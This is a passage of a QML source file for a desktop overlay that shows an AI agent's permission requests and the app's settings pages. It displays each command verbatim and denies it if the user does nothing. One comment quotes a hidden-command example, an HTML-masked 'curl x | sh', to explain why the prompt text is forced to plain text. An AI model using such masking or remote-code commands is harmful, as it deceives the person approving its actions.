    path: (Quickshell.env("XDG_RUNTIME_DIR") || "/run/user/1000") + "/agentvoice/state"
    watchChanges: true
    printErrors: false
    onFileChanged: stateFile.reload()
    onLoadFailed: root.vState = "off"
    onLoaded: {
      try {
        var d = JSON.parse(text())
        root.vState = String(d.state || "off")
        root.levelDb = d.level_db !== undefined ? d.level_db : -99
        if (d.gate_db !== undefined) root.gateDb = d.gate_db
        if (d.floor_db !== undefined) root.floorDb = d.floor_db
        if (d.transcript !== undefined) root.lastTranscript = String(d.transcript)
        if (d.reply !== undefined) root.lastReply = String(d.reply)
        // A locked payload carries no text, and a field that is not sent
        // keeps its value: the Overview's LAST EXCHANGE would have kept the
        // exchange through the lock, for an overlay summoned over it
        // (Codex review of M3; pre-existing).
        if (root.vState === "locked") { root.lastTranscript = ""; root.lastReply = "" }
        root.vPreview = d.preview === true
        if (d.latency_ms !== undefined) root.lastLatencyMs = Math.round(d.latency_ms)
        root.lastWho = d.who !== undefined ? String(d.who) : ""
        if (d.agent !== undefined) root.vAgent = String(d.agent)
        if (d.level !== undefined) root.permissionLevel = String(d.level)
        if (d.posture !== undefined) root.vPosture = String(d.posture)
        if (d.levels !== undefined) root.agentLevels = d.levels
        if (d.remembers !== undefined) root.vRemembers = (d.remembers === true)
        if (d.overriding !== undefined) root.vOverriding = String(d.overriding)
        if (d.governed !== undefined) root.vGoverned = (d.governed === true)
        if (d.verifier !== undefined) root.vVerifier = (d.verifier === true)
        if (d.takes_model !== undefined) root.vTakesModel = (d.takes_model === true)
        if (d.model_lists && typeof d.model_lists === "object") root.modelLists = d.model_lists
        // Reset when absent rather than kept: with no agent running the
        // field is not published, and a control left over from the last one
        // would be a control that does nothing.
        root.vEfforts = Array.isArray(d.efforts) ? d.efforts : []
        // Whether that list is the daemon's answer or only the default: the
        // Agents page calls a saved effort stale only on an answer (M5).
        root.vEffortsKnown = Array.isArray(d.efforts)
        root.vCrew = Array.isArray(d.crew) ? d.crew : []
        root.vLive = (d.live && typeof d.live === "object") ? d.live : ({})
        root.vAgentFiles = (d.agent_files && typeof d.agent_files === "object") ? d.agent_files : ({})
        // Collaboration tasks (Phase 15); absent when there are none.
        root.vTasks = Array.isArray(d.tasks) ? d.tasks : []
        root.vLimitHits = (d.limit_hits && typeof d.limit_hits === "object")
                          ? d.limit_hits : ({})
        root.vService = (d.service && typeof d.service === "object") ? d.service : ({})
      } catch (e) {}
    }
  }

  // The scroller the current page sits in, for sliders' wheel handling.
  property Flickable pageScroll: null

  PanelWindow {
    id: window
    visible: root.opened
    color: "transparent"
    WlrLayershell.namespace: "agentvoice-settings"
    WlrLayershell.layer: WlrLayer.Overlay
    WlrLayershell.keyboardFocus: WlrKeyboardFocus.Exclusive
    exclusionMode: ExclusionMode.Ignore
    anchors { top: true; bottom: true; left: true; right: true }

    // Click-away closes, same as every other Omarchy overlay.
    MouseArea {
      anchors.fill: parent
      onClicked: root.dismiss()
    }

    Rectangle {
      anchors.fill: parent
      color: root.scrim
    }

    // BorderSurface *is* the card -- it draws the themed border itself, the
    // way every shipped overlay uses it.
    BorderSurface {
      id: card
      // Found by name by bench/preview targets that draw it narrow.
      objectName: "settingsCard"
      anchors.centerIn: parent
      // The settings get a sidebar and room beside it, the Chats page a
      // little more, for a list and a chat side by side (M18); the prompt is
      // one question.
      width: Math.min(Style.space(root.mode === "permission" ? 560 : root.page === "chats" ? 980 : 880),
                      parent.width - Style.gapsOut * 2)
      height: root.mode === "permission"
              ? Math.min(Style.space(300), parent.height - Style.gapsOut * 2)
              : Math.min(Style.space(700), parent.height - Style.gapsOut * 2)
      radius: Style.cornerRadius
      color: root.background
      borderSpec: root.borderSpec

      // Swallow clicks so they don't reach the dismiss handler behind.
      MouseArea { anchors.fill: parent }

      Keys.onEscapePressed: root.dismiss()
      // Ctrl+1..9 jump to the first nine pages in sidebar order, Ctrl+0 to
      // the tenth (phase M8, the Crew map made ten), and Ctrl+PgUp/PgDn
      // step to the page above or below, so a page past the tenth -- About,
      // since Chats made eleven (M18) -- is still reachable from the keyboard.
      Keys.onPressed: function(e) {
        if (root.mode !== "settings" || !(e.modifiers & Qt.ControlModifier)) return
        var n = root.pageForKey(e.key)
        if (n >= 0 && n < root.pages.length) {
          root.goTo(root.pages[n].id, "")
          e.accepted = true
        }
      }
      focus: root.opened

      Column {
        id: body
        anchors.fill: parent
        anchors.margins: Style.spacing.panelPadding
        spacing: Style.spacing.md

        Item {
          width: parent.width
          height: Math.max(titleText.implicitHeight, headerButtons.implicitHeight)

          Text {
            id: titleText
            anchors.left: parent.left
            anchors.verticalCenter: parent.verticalCenter
            text: root.mode === "permission" ? "Allow this?" : "Agent Voice"
            color: root.mode === "permission" ? root.urgent : root.foreground
            font.family: root.fontFamily
            font.pixelSize: Style.font.title
            font.bold: true
          }

          Row {
            id: headerButtons
            anchors.right: parent.right
            anchors.verticalCenter: parent.verticalCenter
            spacing: Style.space(12)

            // No "Conversation" button here since phase M18: the chats
            // are a page in the sidebar, and the button's name collided
            // with the Conversation settings page's.
            Text {
              id: hint
              anchors.verticalCenter: parent.verticalCenter
              // Once answered the countdown is over: say what became of it
              // rather than leave a frozen number (M7).
              text: root.mode !== "permission" ? "esc to close"
                    : !root.answered ? "denied in " + root.secondsLeft + "s"
                    : root.answerFailed ? "denied · esc to close"
                    : "sending…"
              color: root.dim
              font.family: root.fontFamily
              font.pixelSize: Style.font.caption
            }
          }
        }

        PanelSeparator { width: parent.width; foreground: root.foreground }

        // --- permission prompt ----------------------------------------
        Column {
          width: parent.width
          spacing: Style.spacing.md
          visible: root.mode === "permission"

          Text {
            width: parent.width
            wrapMode: Text.WordWrap
            text: (root.askerName() !== "" ? "The agent “" + root.askerName() + "”" : "The agent") +
                  // Whom it works for, on a task another agent passed it
                  // (Phase 15): "…, for Theo, for you, wants to …".
                  (String(root.request.chain || "") !== "" ? ", " + String(root.request.chain) + "," : "") +
                  " wants to " + root.toolWords(root.request.tool) + "."
            textFormat: Text.PlainText
            color: root.foreground
            font.family: root.fontFamily
            font.pixelSize: Style.font.body
          }

          // Why this one is being asked about, when the tool and the path do
          // not say it on their own -- a Read is usually free, so a Read that
          // prompts has a reason worth putting on screen.
          Text {
            width: parent.width
            wrapMode: Text.WordWrap
            visible: (root.request.note || "") !== ""
            text: root.request.note || ""
            textFormat: Text.PlainText
            color: root.urgent
            font.family: root.fontFamily
            font.pixelSize: Style.font.caption
          }

          // The command itself, verbatim. Paraphrasing what is about to run
          // would defeat the point of asking -- and so does showing only as
          // much of it as happens to fit, which is why this scrolls: the card
          // is capped in height, and a long command used to be cut off at the
          // bottom edge with nothing to say it had been.
          BorderSurface {
            width: parent.width
            height: Math.min(Style.space(160),
                             Math.max(Style.space(44),
                                      cmd.implicitHeight + Style.space(16)))
            radius: Style.cornerRadius
            color: Qt.rgba(root.foreground.r, root.foreground.g, root.foreground.b, 0.06)
            borderSpec: root.borderSpec

            Flickable {
              id: cmdScroll
              anchors.fill: parent
              anchors.margins: Style.space(8)
              contentWidth: width
              contentHeight: cmd.implicitHeight
              clip: true
              boundsBehavior: Flickable.StopAtBounds
              flickableDirection: Flickable.VerticalFlick
              interactive: contentHeight > height
              QQC.ScrollBar.vertical: QQC.ScrollBar {
                policy: QQC.ScrollBar.AsNeeded
              }

              Text {
                id: cmd
                width: cmdScroll.width
                wrapMode: Text.WrapAnywhere
                text: root.request.summary || "(no detail)"
                // The one Text in this file that must never be rich: it is
                // the command about to run. `ls <b></b><!-- ; curl x | sh -->`
                // renders as `ls` under AutoText, which turns the prompt
                // into a lie about what is being consented to.
                textFormat: Text.PlainText
                color: root.foreground
                font.family: "monospace"
                font.pixelSize: Style.font.caption
              }
            }
          }

          // How much of it there is, since the card shows a window onto it.
          Text {
            width: parent.width
            visible: (root.request.length || 0) > 0
            text: (root.request.length || 0) + " characters"
                  + ((root.request.truncated || 0) > 0
                     ? ", " + root.request.truncated + " of them not shown"
                     : "")
                  + (cmdScroll.contentHeight > cmdScroll.height
                     ? " · scroll to read it all" : "")
            textFormat: Text.PlainText
            color: (root.request.truncated || 0) > 0 ? root.urgent : root.dim
            font.family: root.fontFamily
            font.pixelSize: Style.font.caption
          }

          Row {
            width: parent.width
            spacing: Style.spacing.md
            Button {
              text: "Deny"
              fontFamily: root.fontFamily
              bordered: true
              enabled: !root.answered
              opacity: enabled ? 1 : 0.45
              onClicked: root.answer("deny")
            }
            Button {
              text: "Allow once"
              fontFamily: root.fontFamily
              bordered: true
              enabled: root.mayAllow
              opacity: enabled ? 1 : 0.45
              onClicked: root.answer("allow")
            }
            // Everything this agent asks for in this conversation, from now
            // until a new conversation starts or the service restarts. Only
            // offered when the hook has a conversation to scope it to.
            Button {
              visible: root.request.sessionWide === true
              text: "Allow all in this chat"
              tooltipText: "Allow this and everything else " +
                           (root.askerName() || "the agent") +
                           " asks for until the conversation ends"
              fontFamily: root.fontFamily
              bordered: true
              enabled: root.mayAllow
              opacity: enabled ? 1 : 0.45
              onClicked: root.answer("allow-session")
            }
          }

          // Why Allow is greyed out, when the daemon did not hand this card
          // the nonce an allow needs (M7): a control that does nothing says
          // why. And what happened to an answer once it was sent.
          Text {
            width: parent.width
            wrapMode: Text.WordWrap
            visible: text !== ""
            text: root.answerNote !== "" ? root.answerNote
                : (root.request.id && root.request.verified !== true && !root.answered)
                  ? "Allow cannot be accepted from here: " +
                    String(root.request.why || "this card was not handed to the Agent Voice panel") +
                    ". Deny still works, and doing nothing is a no."
                  : ""
            textFormat: Text.PlainText
            color: (root.answerFailed || root.answerNote === "") ? root.urgent : root.dim
            font.family: root.fontFamily
            font.pixelSize: Style.font.caption
          }

          Text {
            width: parent.width
            wrapMode: Text.WordWrap
            text: "Doing nothing denies it. Read-only tools are never asked about." +
                  (root.request.sessionWide === true
                   ? " \"Allow all in this chat\" lasts until a new conversation starts or the service restarts."
                   : "")
            color: root.dim
            font.family: root.fontFamily
            font.pixelSize: Style.font.caption
          }
        }

        // --- settings: the sidebar and the page beside it ---------------
        Item {
          id: settingsArea
          visible: root.mode === "settings"
          width: parent.width
          height: body.height - y

          SidebarNav {
            id: sidebar
            anchors.left: parent.left
            anchors.top: parent.top
            width: Style.space(170)
            pages: root.pages
            current: root.page
            foreground: root.foreground
            fontFamily: root.fontFamily
            onPicked: function(id) { root.goTo(id, "") }
          }

          // Things that are not a page: what failed to save, and why a
          // switch did nothing. Under the sidebar so they never push the
          // page about.
          Column {
            anchors.left: parent.left
            anchors.bottom: parent.bottom
            width: sidebar.width
            spacing: Style.space(6)

            Text {
              width: parent.width
              visible: store.error !== ""
              wrapMode: Text.WordWrap
              text: store.error
              textFormat: Text.PlainText
              color: root.urgent
              font.family: root.fontFamily
              font.pixelSize: Style.font.caption
            }
            Text {
              width: parent.width
              visible: root.note !== ""
              wrapMode: Text.WordWrap
              text: root.note
              textFormat: Text.PlainText
              color: root.urgent
              font.family: root.fontFamily
              font.pixelSize: Style.font.caption
            }
            Text {
              width: parent.width
              wrapMode: Text.WordWrap
              text: "ctrl+1–9, 0 or pgup/pgdn to switch pages"
              color: root.dim
              font.family: root.fontFamily
              font.pixelSize: Style.font.caption
            }
          }

          Rectangle {
            id: rule
            anchors.left: sidebar.right
            anchors.leftMargin: Style.space(14)
            anchors.top: parent.top
            anchors.bottom: parent.bottom
            width: 1
            color: root.faint
          }

          Flickable {
            id: formScroll
            anchors.left: rule.right
            anchors.leftMargin: Style.space(18)
            anchors.right: parent.right
            anchors.top: parent.top
            anchors.bottom: parent.bottom
            contentWidth: width
            contentHeight: pageLoader.implicitHeight + Style.space(16)
            clip: true
            boundsBehavior: Flickable.StopAtBounds
            // The configuration every other scrolling panel in Omarchy uses --
            // with a ScrollBar attached the Controls wheel handling applies,
            // rather than a bare Flickable's short, momentum-less step.
            flickableDirection: Flickable.VerticalFlick
            interactive: contentHeight > height
            // Namespaced: a plain `import QtQuick.Controls` shadows Omarchy's
            // own Button, Toggle and Dropdown with the Controls types of the
            // same names. qs.Ui is imported last so it wins at runtime, but
            // qmllint cannot tell, and neither can a reader.
            QQC.ScrollBar.vertical: QQC.ScrollBar { policy: QQC.ScrollBar.AsNeeded }
            Component.onCompleted: root.pageScroll = formScroll

            Loader {
              id: pageLoader
              width: formScroll.width - Style.space(14)
              // Built when shown and dropped when left: nine pages of
              // controls bound to live state, of which one is ever on screen.
              active: root.opened && root.mode === "settings"
              sourceComponent: root.page === "agents" ? agentsPage
                             : root.page === "agentdetails" ? agentDetailsPage
                             : root.page === "communal" ? communalPage
                             : root.page === "crew" ? crewPage
                             : root.page === "chats" ? chatsPage
                             : root.page === "listening" ? listeningPage
                             : root.page === "conversation" ? conversationPage
                             : root.page === "voice" ? voicePage
                             : root.page === "display" ? displayPage
                             : root.page === "about" ? aboutPage
                             : overviewPage
            }
          }

          Component { id: overviewPage;     OverviewPage { s: root } }
          Component { id: agentsPage;       AgentsPage { s: root } }
          Component { id: agentDetailsPage; AgentDetailsPage { s: root } }
          Component { id: communalPage;     CommunalPage { s: root } }
          Component { id: crewPage;         CrewMapPage { s: root } }
          Component { id: chatsPage;        ChatsPage { s: root } }
          Component { id: listeningPage;    ListeningPage { s: root } }
          Component { id: conversationPage; ConversationPage { s: root } }
          Component { id: voicePage;        VoicePage { s: root } }
          Component { id: displayPage;      DisplayPage { s: root } }
          Component { id: aboutPage;        AboutPage { s: root } }
        }

      }

      // "Send to another agent" over a chat (Phase 15). Inside the card, so
      // Escape and a click outside behave as for the rest of it.
      SendSheet {
        id: sendSheet
        anchors.fill: parent
        // Inside the card's border, which stays drawn around it.
        anchors.margins: Math.max(1, Style.space(2))
        z: 10
        s: root
      }
      // Only over the page it was opened from: changing page, or closing
      // the overlay, drops an unsent sheet rather than leaving it over
      // another page.
      Connections {
        target: root
        function onModeChanged() { sendSheet.close() }
        function onPageChanged() { sendSheet.close() }
        function onOpenedChanged() { if (!root.opened) sendSheet.close() }
      }
    }
  }
}
